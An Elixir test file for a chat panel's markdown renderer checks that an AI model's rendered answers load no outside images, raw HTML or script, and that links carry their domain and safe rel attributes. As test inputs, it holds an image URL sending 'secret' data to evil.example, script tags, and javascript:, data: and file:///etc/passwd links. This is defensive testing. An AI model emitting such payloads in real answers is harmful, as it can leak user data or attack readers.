defmodule PhoenixKitAgent.Web.MarkdownTest do
  @moduledoc """
  The answers of the model as the chat panel shows them (spec §8.2): markdown
  without anything that loads by itself — no `<img>` with an outside `src`, no
  raw HTML — and every link with its domain beside it and
  `rel="noopener noreferrer nofollow"`.
  """

  use ExUnit.Case, async: true

  alias PhoenixKitAgent.Web.Markdown

  defp html(text), do: text |> Markdown.to_html() |> Phoenix.HTML.safe_to_string()
  defp doc(text), do: LazyHTML.from_fragment(html(text))

  test "a picture with an outside address gives no <img>, only its text" do
    out = html("Here: ![the chart](http://evil.example/leak?d=secret) and on.")

    assert LazyHTML.query(doc("![x](https://evil.example/a.png)"), "img") |> Enum.count() == 0
    refute out =~ "<img"
    refute out =~ "evil.example"
    assert out =~ "the chart"
  end

  test "a picture inside a link or a reference definition loads nothing either" do
    out =
      html("""
      [![badge](https://evil.example/b.png)](https://evil.example/go)

      ![ref][r]

      [r]: https://evil.example/r.png
      """)

    refute out =~ "<img"
    refute out =~ "b.png"
    refute out =~ "r.png"
  end

  test "raw HTML is shown as text, never as markup" do
    out = html(~s|<img src="https://evil.example/x.png"> <script>alert(1)</script> <b>bold</b>|)

    assert LazyHTML.query(doc(~s|<img src="https://evil.example/x.png">|), "img") |> Enum.count() ==
             0

    assert LazyHTML.query(doc("<script>alert(1)</script>"), "script") |> Enum.count() == 0
    assert out =~ "&lt;img"
    assert out =~ "&lt;script&gt;"
  end

  test "a link carries its domain and rel=\"noopener noreferrer nofollow\"" do
    fragment = doc("See [the bank](https://evil.example/login?x=1) now.")

    [link] = fragment |> LazyHTML.query("a") |> Enum.to_list()
    assert LazyHTML.attribute(link, "href") == ["https://evil.example/login?x=1"]
    assert LazyHTML.attribute(link, "rel") == ["noopener noreferrer nofollow"]
    assert LazyHTML.attribute(link, "target") == ["_blank"]
    assert LazyHTML.text(fragment) =~ "evil.example"
    assert fragment |> LazyHTML.query("[data-link-domain]") |> LazyHTML.text() =~ "evil.example"
  end

  test "a bare address becomes a link with its domain too" do
    fragment = doc("Look at https://docs.example.org/page")

    [link] = fragment |> LazyHTML.query("a") |> Enum.to_list()
    assert LazyHTML.attribute(link, "rel") == ["noopener noreferrer nofollow"]

    assert fragment |> LazyHTML.query("[data-link-domain]") |> LazyHTML.text() =~
             "docs.example.org"
  end

  test "a link that is not http(s) is only text" do
    for url <- ["javascript:alert(1)", "data:text/html;base64,PHNjcmlwdD4=", "file:///etc/passwd"] do
      out = html("[click](#{url})")
      refute out =~ "<a", "made a link of #{url}"
      assert out =~ "click"
    end
  end

  test "ordinary markdown keeps its shape, escaped" do
    fragment =
      doc("""
      # Title

      Some **bold**, *it* and `x < y`.

      - one
      - two

      | a | b |
      |---|---|
      | 1 | 2 |

      ```
      <tag>
      ```
      """)

    assert fragment |> LazyHTML.query("strong") |> LazyHTML.text() == "bold"
    assert fragment |> LazyHTML.query("em") |> LazyHTML.text() == "it"
    assert fragment |> LazyHTML.query("code") |> Enum.count() == 2
    assert fragment |> LazyHTML.query("li") |> Enum.count() == 2
    assert fragment |> LazyHTML.query("table td") |> Enum.count() == 2
    assert fragment |> LazyHTML.query("pre") |> LazyHTML.text() =~ "<tag>"
    assert html("```\n<tag>\n```") =~ "&lt;tag&gt;"
  end

  test "nil and blank give nothing" do
    assert html(nil) == ""
    assert html("") == ""
  end
end
